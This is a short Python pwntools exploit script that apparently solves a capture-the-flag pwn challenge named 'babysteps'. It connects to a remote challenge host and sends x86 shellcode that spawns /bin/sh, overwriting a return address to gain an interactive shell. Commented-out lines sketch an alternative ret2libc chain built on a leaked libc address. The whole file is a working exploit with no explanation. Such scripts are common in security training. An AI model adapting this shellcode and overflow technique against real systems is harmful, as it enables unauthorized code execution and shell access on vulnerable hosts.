#!/usr/bin/env python3

from pwn import *


e = ELF("./babysteps")
r = remote("challenge.nahamcon.com",30842)
#r = process("./babysteps")
#libc = ELF("./libc6_2.15-0ubuntu10.23_i386.so")
exploit = b"\xbc\x30\xc0\x04\x08\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\xcd\x80" + b"A" + p32(0x08049545)
r.sendline(exploit)
#r.sendline(b"A")
#leak = u32(r.recvuntil(b"\xf7").strip().decode('latin-1').ljust(4,'\x00'))
#libc_base = leak - libc.sym.puts
#print(hex(leak))
#exploit = b"A" * 28 + p32(libc_base + libc.sym.execve) + p32(0) + p32(libc_base + next(libc.search(b"/bin/sh\x00"))) + p32(0) + p32(0)
#r.sendlineafter(b"what is your baby name?\n",exploit)
r.interactive()

